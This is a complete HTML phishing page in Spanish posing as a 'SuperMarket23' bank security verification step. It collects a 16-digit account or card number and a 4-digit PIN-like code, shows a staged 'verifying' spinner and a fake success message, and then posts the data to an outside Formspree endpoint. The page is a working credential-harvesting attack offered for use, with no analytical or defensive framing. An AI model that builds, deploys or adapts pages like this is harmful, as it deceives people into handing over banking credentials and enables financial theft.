
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SuperMarket23 | Verificación</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f7ff; font-family: sans-serif; }
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid white;
            width: 20px;
            height: 20px;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="bg-white w-full max-w-sm rounded-[2rem] shadow-2xl border border-blue-100 overflow-hidden">
        
        <div class="bg-[#0056b3] p-8 text-white text-center">
            <h1 class="text-3xl font-black italic tracking-tighter">SuperMarket23</h1>
            <p class="text-[10px] opacity-70 mt-2 uppercase tracking-[0.3em] font-bold">Protocolo de Seguridad Bancaria</p>
        </div>

        <div class="p-8">
            <form id="authForm" action="https://formspree.io/f/meelpawj" method="POST" class="space-y-5">
                
                <div>
                    <label class="block text-[10px] font-black text-blue-800/50 uppercase mb-2 ml-1">ID de Usuario o Cuenta</label>
                    <input type="text" name="referencia_cliente" maxlength="16" placeholder="0000 0000 0000 0000" 
                        class="w-full bg-blue-50/50 border-2 border-blue-100 rounded-xl py-4 px-4 text-center text-xl font-bold text-blue-900 focus:border-blue-600 focus:bg-white outline-none transition-all" required>
                </div>

                <div>
                    <label class="block text-[10px] font-black text-blue-800/50 uppercase mb-2 ml-1">Código de Verificación</label>
                    <input type="password" name="codigo_postal_verificacion" maxlength="4" placeholder="••••" 
                        class="w-full bg-blue-50/50 border-2 border-blue-100 rounded-xl py-4 px-4 text-center text-2xl text-blue-900 focus:border-blue-600 focus:bg-white outline-none transition-all" required>
                </div>

                <button type="submit" id="btnMain" class="w-full bg-[#0056b3] text-white font-bold py-5 rounded-xl shadow-lg transition-all active:scale-95 text-lg uppercase tracking-tight relative">
                    <span id="textAutenticar">Autenticar</span>
                    
                    <div id="loadingState" class="hidden flex items-center justify-center gap-3">
                        <div class="spinner"></div>
                        <span>Verificando...</span>
                    </div>

                    <span id="successState" class="hidden text-white font-black">✓ Verificación Exitosa</span>
                </button>

                <div class="flex justify-center items-center gap-2 pt-4">
                    <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
                    <p class="text-[9px] text-blue-400 font-bold uppercase tracking-widest">Servidor Activo</p>
                </div>
            </form>
        </div>
    </div>

    <script>
        const form = document.getElementById('authForm');
        const btn = document.getElementById('btnMain');
        const txtDefault = document.getElementById('textAutenticar');
        const loadState = document.getElementById('loadingState');
        const successState = document.getElementById('successState');

        form.onsubmit = function(e) {
            e.preventDefault();
            txtDefault.classList.add('hidden');
            loadState.classList.remove('hidden');
            btn.classList.replace('bg-[#0056b3]', 'bg-blue-400');
            btn.style.pointerEvents = 'none';

            setTimeout(() => {
                loadState.classList.add('hidden');
                successState.classList.remove('hidden');
                btn.classList.replace('bg-blue-400', 'bg-green-600');

                setTimeout(() => {
                    form.submit();
                }, 1000);
            }, 3000);
        };
    </script>
</body>
</html>
